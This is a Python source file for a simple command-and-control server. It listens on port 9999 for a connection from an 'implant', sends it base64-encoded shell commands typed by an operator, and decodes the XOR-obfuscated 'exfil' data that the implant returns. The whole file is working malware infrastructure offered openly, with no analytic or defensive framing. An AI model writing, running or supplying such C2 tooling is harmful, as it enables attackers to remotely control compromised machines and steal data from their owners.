import socket
import base64

def connect_to_implant( server_socket , port ):
    '''
    Setup port for listening , accepting and connecting with implant
    '''
    server_socket.setsockopt( socket.SOL_SOCKET , socket.SO_REUSEADDR, 1 )
    server_socket.bind( ( '0.0.0.0' , port ) )
    server_socket.listen( 1 )
    print( "Listening for connection on port {} ".format( port ) )
    conn, addr = server_socket.accept()
    return conn, addr

def encode_command( cmd ):
    '''
    Encode command to Base 64
    '''
    b64_encoded_cmd = base64.b64encode( cmd.encode() ).decode()
    b64_encoded_cmd = b64_encoded_cmd.encode() + b'\n'
    return b64_encoded_cmd

def decode_exfil( conn , data_length ):
    '''
    Decode exfil returned by implant
    '''
    xor_encoded_exfil = conn.recv( int( data_length ) ).decode()
    # Decode the exfil using XOR
    exfil = ''.join( chr( ord( c ) ^ 0x20 ) for c in xor_encoded_exfil )  # Same key as the client
    return exfil


def main():
    '''
    Main entry function for C2
    '''
    port = 9999

    with socket.socket() as server_socket:
        conn, addr = connect_to_implant( server_socket , port )
        # Start communicating with implant once connection is setup
        with conn:
            print( "Connected by", addr )
            while True:
                # Get command to send to implant
                cmd = input( "Enter command: " )
                if not cmd:
                    break
                # Encode command
                encoded_cmd = encode_command( cmd )
                conn.send( encoded_cmd )
                # Receive exfil from the implant
                data_length = conn.recv( 10 ).decode()
                if not data_length:
                    print( "Connection ended by the client." )
                    break
                exfil = decode_exfil( conn , data_length )
                print( "Exfil from implant:", exfil )

if __name__ == '__main__':
    main()
